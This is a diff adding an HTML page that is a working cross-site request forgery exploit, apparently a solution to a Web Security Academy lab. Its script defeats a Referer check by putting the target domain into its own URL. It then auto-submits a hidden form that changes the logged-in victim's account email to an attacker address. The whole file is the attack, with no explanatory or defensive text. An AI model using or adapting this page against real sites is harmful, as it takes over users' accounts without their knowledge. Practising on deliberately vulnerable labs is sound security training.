@@ -1,0 +1,38 @@
+<html>
+<head>
+    <title>CSRF with Referer bypass</title>
+</head>
+<body>
+    <script>
+        // The server checks if Referer contains the domain
+        // We need to ensure our URL has the target domain in it
+        
+        // Check current URL
+        const currentUrl = window.location.href;
+        const targetDomain = '0a9d00a00374d7d882c0659700670057.web-security-academy.net';
+        
+        if (!currentUrl.includes(targetDomain)) {
+            // Add domain to URL and reload
+            if (currentUrl.includes('?')) {
+                window.location.href = currentUrl + '&' + targetDomain;
+            } else {
+                window.location.href = currentUrl + '?' + targetDomain;
+            }
+        } else {
+            // Domain is in URL, create and submit form
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://0a9d00a00374d7d882c0659700670057.web-security-academy.net/my-account/change-email';
+            
+            const email = document.createElement('input');
+            email.type = 'hidden';
+            email.name = 'email';
+            email.value = 'pwned@evil-hacker.net';
+            
+            form.appendChild(email);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
